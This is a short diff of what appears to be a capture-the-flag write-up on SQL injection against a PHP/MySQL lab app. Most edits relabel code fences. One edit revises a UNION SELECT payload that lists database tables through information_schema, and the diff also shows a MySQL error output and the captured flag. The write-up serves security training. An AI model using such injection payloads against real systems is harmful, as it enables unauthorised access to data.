@@ -30,7 +30,7 @@ Initial observation: the application appears to be running PHP (notice the `.php
 
     The application responds with a MySQL error:
 
-    ```
+    ```text
     You have an error in your SQL syntax; check the manual that corresponds to your
     MySQL server version for the right syntax to use near ''''' at line 1
     ```
@@ -99,7 +99,7 @@ Initial observation: the application appears to be running PHP (notice the `.php
     Now enumerate tables inside `ctfdb`:
 
     ```sql
-    ' UNION SELECT table_name,NULL FROM information_schema.tables--
+    ' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
     ```
 
     <Note>
@@ -134,7 +134,7 @@ Initial observation: the application appears to be running PHP (notice the `.php
 
     The dashboard renders:
 
-    ```
+    ```text
     CTF{un10n_1nj3ct10n_m4st3r_2024}
     ```
 
